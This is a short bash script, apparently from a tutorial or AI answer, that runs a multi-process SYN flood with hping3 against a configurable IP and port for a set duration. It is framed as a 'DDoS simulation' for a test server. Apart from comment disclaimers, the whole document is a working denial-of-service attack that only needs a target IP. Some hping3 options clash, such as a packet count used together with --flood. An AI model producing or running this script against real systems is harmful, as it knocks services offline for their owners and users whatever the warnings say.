# This script simulates a basic DDoS attack against a test server in GCP.
# It's intended for testing and educational purposes ONLY.  
# DO NOT use this script against systems you do not own or have permission to test.
# Unauthorized use is illegal and unethical.
# This script uses `hping3`, so make sure it's installed.  (sudo apt install hping3)
# This script will flood a target IP address with SYN packets.
# Note that this script is a rudimentary simulation, and a real DDoS attack
# is much more sophisticated.
# IMPORTANT: Run this script in a safe, controlled environment, ideally
# against a test server specifically created for this purpose.

# Configuration
TARGET_IP="your_target_ip_address"  # Replace with your test server's IP
PORT=80                              # Replace with the target port
PACKET_SIZE=64                       # Size of the packets to send
DURATION=60                          # Duration of the attack in seconds
THREADS=4                            # Number of threads to use

# Function to send SYN flood
syn_flood() {
  local target_ip=$1
  local port=$2
  local packet_size=$3

  hping3 -c 100000 -i u10 -S -p $port -d $packet_size --flood $target_ip > /dev/null 2>&1
}

# Start multiple threads to simulate a distributed attack
for ((i=1; i<=$THREADS; i++)); do
  syn_flood $TARGET_IP $PORT $PACKET_SIZE &
done

# Wait for the specified duration
sleep $DURATION

# Kill all background processes (hping3 instances)
killall hping3

echo "DDoS simulation completed."
```